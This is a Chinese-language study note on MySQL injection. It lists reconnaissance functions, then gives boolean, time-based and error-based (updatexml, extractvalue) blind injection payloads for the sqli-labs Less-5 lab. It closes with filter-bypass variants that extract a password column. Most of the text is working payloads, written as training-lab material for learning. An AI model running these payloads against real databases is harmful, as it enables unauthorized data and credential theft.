# day2:mysql 注入

信息搜集:

查找版本

```React JSX
select version();
select @@version;
select /*!40000 user()*/;
```


查找mysql路径

```React JSX
select @@datadir;
```


查找操作系统

```React JSX
select @@version_compile_os;
```


`system_user()` //系统用户名 

`user()`  // 用户名 

`current_user()`  //当前用户名

`session_user()` //链接数据库的用户名



分隔符

```React JSX
1. concat(str1,str2,...)——没有分隔符地连接字符串 
2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串 
3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据
```


截取字符

```React JSX
mid(database(),1,1)>'a'   查看数据库第一位   mid(string,start,length)
```


```React JSX
substr(string,start,length) 同 substring
```


```React JSX
left(string,n)  n为长度
```


```React JSX
ord(mid(database(),1,1))>114 检测database()的第一位ascii码是否大于114,同ascii()
```


![](image/image.png)





### 盲注:

基于布尔 SQL 盲注
基于时间的 SQL 盲注
基于报错的 SQL 盲注



### less 5

布尔盲注:

```React JSX
http://192.168.162.130/Less-5/?id=1'  and if((select mid((select group_concat(table_name) from information_schema.tables where table_schema="security"),1,1)>'a'),1,0)--+
```


```React JSX
http://192.168.162.130/Less-5/?id=1'  and 1=if((select mid((select group_concat(table_name) from information_schema.tables where table_schema="security"),1,7)='emails,'),1,0)--+
```


用ascii码判断

```React JSX
http://192.168.162.130/Less-5/?id=1'  and 1=if((select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema="security"),1,1))>60),1,0)--+
```


基于时间的 SQL 盲注:

```React JSX
http://192.168.162.130/Less-5/?id=1'  and if((select mid((select group_concat(table_name) from information_schema.tables where table_schema="security"),1,sleep(5))='a'),1,0)--+
```


基于报错的 SQL 盲注:

因为concat()是将其连接成一个字符串，不符合xpath_string格式，会出现格式错误而报错

- updatexml

```React JSX
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
```


```React JSX
1' and updatexml(1,concat(0x7,substring((select group_concat(schema_name) from information_schema.schemata),1,32)),0)
```


- extractvalue

```React JSX
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))
```


```React JSX
-1' and extractvalue(1,concat(0x7,substring((select group_concat(schema_name) from information_schema.schemata),60,32)))
```




- 当substring被过滤时,可用left(),right()将字符串进行拼接

```React JSX
1'^(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))),1))
```


```React JSX
1'^(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))),1))
```






宽字节,insert注入,delete注入,二次注入

